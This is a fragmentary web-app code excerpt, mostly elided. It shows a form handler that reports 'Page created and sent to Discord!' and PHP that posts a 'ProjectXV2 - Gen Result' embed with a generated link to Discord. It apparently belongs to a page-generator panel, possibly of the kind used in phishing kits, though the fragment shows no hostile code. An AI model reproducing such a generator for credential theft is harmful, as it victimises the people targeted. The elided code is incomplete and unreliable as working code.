  ...
  <script>
    ...
    dualF.addEventListener('submit', async e => {
      ...
      try {
        ...
        setTimeout(() => {
          setMsg(dualMsg, res.ok, res.ok ? 'Page created and sent to Discord!' : res.error);
          button.textContent = originalText;
          button.disabled = false;
        }, 800);
      } catch (err) {
...
?>");
    ...
    // Send Discord embed like the screenshot
    $embed = [
        'username' => 'ProjectXV2 - Gen Result',
        'embeds' => [[
            'title' => 'ProjectXV2 - Gen Result',
            'color' => 0x2F3136,
            'fields' => [
                [
                    'name' => 'Link:',
